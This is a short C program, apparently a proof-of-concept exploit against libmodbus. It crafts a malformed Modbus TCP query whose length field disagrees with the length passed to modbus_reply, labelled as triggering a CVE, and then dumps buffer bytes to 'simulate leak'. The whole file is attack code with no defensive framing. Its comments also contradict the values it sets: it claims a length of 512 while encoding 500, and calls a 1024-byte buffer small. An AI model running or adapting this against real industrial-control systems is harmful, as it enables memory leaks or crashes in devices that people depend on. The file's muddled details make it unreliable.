#include <modbus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main() {
    modbus_t *ctx;
    uint8_t query[1024];
    modbus_mapping_t *mb_mapping;

    ctx = modbus_new_tcp("127.0.0.1", 1502);
    if (!ctx) {
        perror("modbus_new_tcp");
        return -1;
    }

    modbus_set_debug(ctx, TRUE);
    mb_mapping = modbus_mapping_new(10, 10, 10, 10);

    // Craft oversized query (length field says 512, but buffer is small)
    query[0] = 0x00; query[1] = 0x01; // TID
    query[2] = 0x00; query[3] = 0x00; // PID
    query[4] = 0x01; query[5] = 0xF4; // Length: 500
    query[6] = 0x01;                 // Unit ID
    query[7] = 0x03;                 // Function code
    query[8] = 0x00; query[9] = 0x00; // Start addr
    query[10] = 0x00; query[11] = 0x10; // Qty: 16 regs

    int rc = modbus_reply(ctx, query, 512, mb_mapping);  // trigger CVE logic
    printf("Return code: %d\n", rc);

    // Attempt to print response — simulate leak
    printf("Dumping query buffer:\n");
    for (int i = 0; i < 64; i++) {
        printf("%02x ", query[i]);
        if (i % 16 == 15) printf("\n");
    }

    modbus_mapping_free(mb_mapping);
    modbus_free(ctx);
    return 0;
}
